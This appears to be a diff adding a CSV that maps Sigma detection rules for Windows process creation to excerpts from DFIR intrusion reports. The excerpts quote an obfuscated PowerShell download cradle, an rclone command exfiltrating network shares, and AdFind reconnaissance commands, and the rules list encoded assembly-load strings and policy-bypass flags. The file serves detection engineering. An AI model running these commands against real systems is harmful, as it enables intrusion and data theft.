@@ -1,0 +1,297 @@
+Filename,Excerpts from DFIR Report,LogSource and Detection
+proc_creation_win_powershell_base64_reflection_assembly_load_obfusc.yml,"Used custom letter-to-hex encoding scheme with unique mappings where letters correspond to hex characters. Multi-layer encoding included first layer with hexadecimal and XOR encoding, second layer with base64 encoded gzip-compressed data. Assembly loading pattern used [reflection.assembly]::Load() method to load encoded payload, decoded payload dynamically using mathematical transformations, and extracted payload from registry keys. The technique demonstrated sophisticated obfuscation to evade detection while loading malicious assemblies in memory.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - 'OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ'
+            - 'oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA'
+            - '6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA'
+            - 'OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ'
+            - 'oAOgAoACIATABvACIAKwAiAGEAZAAiACkA'
+            - '6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA'
+            - 'OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ'
+            - 'oAOgAoACIATABvAGEAIgArACIAZAAiACkA'
+            - '6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA'
+            - 'OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ'
+            - 'oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA'
+            - '6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA'
+            - 'OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ'
+            - 'oAOgAoACcATABvACcAKwAnAGEAZAAnACkA'
+            - '6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA'
+            - 'OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ'
+            - 'oAOgAoACcATABvAGEAJwArACcAZAAnACkA'
+            - '6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA'
+    condition: selection"
+proc_creation_win_powershell_base64_reflection_assembly_load.yml,"Used custom letter-to-hex encoding scheme with unique mappings where letters correspond to hex characters. Multi-layer encoding included first layer with hexadecimal and XOR encoding, second layer with base64 encoded gzip-compressed data. Assembly loading pattern used [reflection.assembly]::Load() method to load encoded payload, decoded payload dynamically using mathematical transformations, and extracted payload from registry keys. The technique demonstrated sophisticated obfuscation to evade detection while loading malicious assemblies in memory.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'
+            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'
+            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'
+            - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'
+            - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'
+            - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'
+            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'
+            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'
+            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'
+            - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'
+            - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'
+            - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'
+    condition: selection"
+proc_creation_win_powershell_download_cradle_obfuscated.yml,"Example obfuscated download cradle: powershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio')). Used custom letter-to-hex encoding scheme with unique mappings. Multi-layer encoding included first layer with hexadecimal and XOR encoding, second layer with base64 encoded gzip-compressed data. The technique demonstrated sophisticated obfuscation to evade detection while loading malicious assemblies in memory.","logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|all:
+            - 'http://127.0.0.1'
+            - '%{(IRM $_)}'
+            - 'Invoke'
+    condition: selection"
+proc_creation_win_powershell_set_policies_to_unsecure_level.yml,"No specific information found about PowerShell execution policy changes or bypasses in the referenced DFIR report. The document mentions PowerShell script agent1.ps1 with obfuscated code and a command powershell.exe -c Reset-ComputerMachinePassword but does not provide details about execution policy modifications.","logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_img:
+        - OriginalFileName:
+              - 'PowerShell.EXE'
+              - 'pwsh.dll'
+        - Image|endswith:
+              - '\powershell.exe'
+              - '\pwsh.exe'
+    selection_option:
+        CommandLine|contains:
+            - '-executionpolicy '
+            - ' -ep '
+            - ' -exec '
+    selection_level:
+        CommandLine|contains:
+            - 'Bypass'
+            - 'Unrestricted'
+    condition: all of selection_*"
+proc_creation_win_pua_adfind_susp_usage.yml,"AdFind is a command line Active Directory query tool used for gathering network information. Threat actors use it to collect details about person objects, computer systems, domain trusts, subnets, and domain controllers. Observed commands include: adfind.exe -gcb -sc trustdmp, adfind.exe -f (objectcategory=group), adfind.exe -subnets -f (objectCategory=subnet), adfind.exe -f (objectcategory=organizationalUnit), adfind.exe -f objectcategory=computer, adfind.exe -f (objectcategory=person). These commands are part of reconnaissance efforts to map domain structure, trust relationships, and user/computer assets.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - 'domainlist'
+            - 'trustdmp'
+            - 'dcmodes'
+            - 'adinfo'
+            - ' dclist '
+            - 'computer_pwdnotreqd'
+            - 'objectcategory='
+            - '-subnets -f'
+            - 'name=""Domain Admins""'
+            - '-sc u:'
+            - 'domainncs'
+            - 'dompol'
+            - ' oudmp '
+            - 'subnetdmp'
+            - 'gpodmp'
+            - 'fspdmp'
+            - 'users_noexpire'
+            - 'computers_active'
+            - 'computers_pwdnotreqd'
+    condition: selection"
+proc_creation_win_pua_advanced_ip_scanner.yml,"Advanced IP Scanner was used to scan the network environment as part of the threat actor's Discovery phase of the intrusion. The scanning was likely done to map out potential target systems for lateral movement, which the threat actor subsequently performed using RDP to access multiple machines in the environment.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|contains: '\advanced_ip_scanner'
+        - OriginalFileName|contains: 'advanced_ip_scanner'
+        - Description|contains: 'Advanced IP Scanner'
+    selection_cli:
+        CommandLine|contains|all:
+            - '/portable'
+            - '/lng'
+    condition: 1 of selection_*"
+proc_creation_win_pua_ditsnap.yml,"Ditsnap was most likely run on the DC to obtain a copy of ntds.dit by creating a snapshot. This suggests the attackers used ditsnap as a technique to access credential information stored in the Active Directory database, which could be used for further lateral movement or privilege escalation during the Snatch ransomware intrusion.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith: '\ditsnap.exe'
+        - CommandLine|contains: 'ditsnap.exe'
+    condition: selection"
+proc_creation_win_pua_pingcastle_script_parent.yml,"PingCastle was used by the threat actor as an Active Directory auditing tool during their intrusion. The tool was executed on a domain controller with the command: pingcastle.exe --healthcheck --level Full. PingCastle is described as an active directory auditing tool used for reconnaissance and security assessment purposes. The threat actor ran this tool as part of their discovery phase, likely to gather information about the Active Directory environment's security configuration and potential vulnerabilities.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_parent_ext:
+        ParentCommandLine|contains:
+            - '.bat'
+            - '.chm'
+            - '.cmd'
+            - '.hta'
+            - '.htm'
+            - '.html'
+            - '.js'
+            - '.lnk'
+            - '.ps1'
+            - '.vbe'
+            - '.vbs'
+            - '.wsf'
+    selection_parent_path_1:
+        ParentCommandLine|contains:
+            - ':\Perflogs\'
+            - ':\Temp\'
+            - ':\Users\Public\'
+            - ':\Windows\Temp\'
+            - '\AppData\Local\Temp'
+            - '\AppData\Roaming\'
+            - '\Temporary Internet'
+    selection_parent_path_2:
+        - ParentCommandLine|contains|all:
+              - ':\Users\'
+              - '\Favorites\'
+        - ParentCommandLine|contains|all:
+              - ':\Users\'
+              - '\Favourites\'
+        - ParentCommandLine|contains|all:
+              - ':\Users\'
+              - '\Contacts\'
+    selection_cli:
+        - Image|endswith: '\PingCastle.exe'
+        - OriginalFileName: PingCastle.exe
+        - Product: 'Ping Castle'
+        - CommandLine|contains:
+              - '--scanner aclcheck'
+              - '--scanner antivirus'
+              - '--scanner computerversion'
+              - '--scanner foreignusers'
+              - '--scanner laps_bitlocker'
+              - '--scanner localadmin'
+              - '--scanner nullsession'
+              - '--scanner nullsession-trust'
+              - '--scanner oxidbindings'
+              - '--scanner remote'
+              - '--scanner share'
+              - '--scanner smb'
+              - '--scanner smb3querynetwork'
+              - '--scanner spooler'
+              - '--scanner startup'
+              - '--scanner zerologon'
+        - CommandLine|contains: '--no-enum-limit'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--level Full'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--server '
+    condition: 1 of selection_parent_* and selection_parent_ext and selection_cli"
+proc_creation_win_pua_pingcastle.yml,"PingCastle was used by the threat actor as an Active Directory auditing tool during their intrusion. The tool was executed on a domain controller with the command: pingcastle.exe --healthcheck --level Full. PingCastle is described as an active directory auditing tool used for reconnaissance and security assessment purposes. The threat actor ran this tool as part of their discovery phase, likely to gather information about the Active Directory environment's security configuration and potential vulnerabilities.","logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Hashes|contains:
+              - 'MD5=f741f25ac909ee434e50812d436c73ff'
+              - 'MD5=d40acbfc29ee24388262e3d8be16f622'
+              - 'MD5=01bb2c16fadb992fa66228cd02d45c60'
+              - 'MD5=9e1b18e62e42b5444fc55b51e640355b'
+              - 'MD5=b7f8fe33ac471b074ca9e630ba0c7e79'
+              - 'MD5=324579d717c9b9b8e71d0269d13f811f'
+              - 'MD5=63257a1ddaf83cfa43fe24a3bc06c207'
+              - 'MD5=049e85963826b059c9bac273bb9c82ab'
+              - 'MD5=ecb98b7b4d4427eb8221381154ff4cb2'
+              - 'MD5=faf87749ac790ec3a10dd069d10f9d63'
+              - 'MD5=f296dba5d21ad18e6990b1992aea8f83'
+              - 'MD5=93ba94355e794b6c6f98204cf39f7a11'
+              - 'MD5=a258ef593ac63155523a461ecc73bdba'
+              - 'MD5=97000eb5d1653f1140ee3f47186463c4'
+              - 'MD5=95eb317fbbe14a82bd9fdf31c48b8d93'
+              - 'MD5=32fe9f0d2630ac40ea29023920f20f49'
+              - 'MD5=a05930dde939cfd02677fc18bb2b7df5'
+              - 'MD5=124283924e86933ff9054a549d3a268b'
+              - 'MD5=ceda6909b8573fdeb0351c6920225686'
+              - 'MD5=60ce120040f2cd311c810ae6f6bbc182'
+              - 'MD5=2f10cdc5b09100a260703a28eadd0ceb'
+              - 'MD5=011d967028e797a4c16d547f7ba1463f'
+              - 'MD5=2da9152c0970500c697c1c9b4a9e0360'
+              - 'MD5=b5ba72034b8f44d431f55275bace9f8b'
+              - 'MD5=d6ed9101df0f24e27ff92ddab42dacca'
+              - 'MD5=3ed3cdb6d12aa1ac562ad185cdbf2d1d'
+              - 'MD5=5e083cd0143ae95a6cb79b68c07ca573'
+              - 'MD5=28caff93748cb84be70486e79f04c2df'
+              - 'MD5=9d4f12c30f9b500f896efd1800e4dd11'
+              - 'MD5=4586f7dd14271ad65a5fb696b393f4c0'
+              - 'MD5=86ba9dddbdf49215145b5bcd081d4011'
+              - 'MD5=9dce0a481343874ef9a36c9a825ef991'
+              - 'MD5=85890f62e231ad964b1fda7a674747ec'
+              - 'MD5=599be548da6441d7fe3e9a1bb8cb0833'
+              - 'MD5=9b0c7fd5763f66e9b8c7b457fce53f96'
+              - 'MD5=32d45718164205aec3e98e0223717d1d'
+              - 'MD5=6ff5f373ee7f794cd17db50704d00ddb'
+              - 'MD5=88efbdf41f0650f8f58a3053b0ca0459'
+              - 'MD5=ef915f61f861d1fb7cbde9afd2e7bd93'
+              - 'MD5=781fa16511a595757154b4304d2dd350'
+              - 'MD5=5018ec39be0e296f4fc8c8575bfa8486'
+              - 'MD5=f4a84d6f1caf0875b50135423d04139f'
+        - Image|endswith: '\PingCastle.exe'
+        - OriginalFileName: PingCastle.exe
+        - Product: 'Ping Castle'
+        - CommandLine|contains:
+              - '--scanner aclcheck'
+              - '--scanner antivirus'
+              - '--scanner computerversion'
+              - '--scanner foreignusers'
+              - '--scanner laps_bitlocker'
+              - '--scanner localadmin'
+              - '--scanner nullsession'
+              - '--scanner nullsession-trust'
+              - '--scanner oxidbindings'
+              - '--scanner remote'
+              - '--scanner share'
+              - '--scanner smb'
+              - '--scanner smb3querynetwork'
+              - '--scanner spooler'
+              - '--scanner startup'
+              - '--scanner zerologon'
+        - CommandLine|contains: '--no-enum-limit'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--level Full'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--server '
+    condition: selection"
+proc_creation_win_pua_rclone_execution.yml,"Rclone was used to collect and exfiltrate data from network shares, masquerading as a svchost executable. Exfiltration command example: svchost.exe --config svchost.conf --progress --no-check-certificate copy \\ServerName\C$\ShareName ftp1:/DomainName/FILES/C/ShareName. Three and a half hours into the intrusion, Rclone was used to collect and exfiltrate the contents of network shares for use in a double extortion demand. Data was exfiltrated to a remote server at 45.147.160.5:443. The attackers carefully disguised the Rclone executable to blend in with normal system processes.","logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_specific_options:
+        CommandLine|contains|all:
+            - '--config '
+            - '--no-check-certificate '
+            - ' copy '
+    selection_rclone_img:
+        - Image|endswith: '\rclone.exe'
+        - Description: 'Rsync for cloud storage'
+    selection_rclone_cli:
+        CommandLine|contains:
+            - 'pass'
+            - 'user'
+            - 'copy'
+            - 'sync'
+            - 'config'
+            - 'lsd'
+            - 'remote'
+            - 'ls'
+            - 'mega'
+            - 'pcloud'
+            - 'ftp'
+            - 'ignore-existing'
+            - 'auto-confirm'
+            - 'transfers'
+            - 'multi-thread-streams'
+            - 'no-check-certificate '
+    condition: selection_specific_options or all of selection_rclone_*"
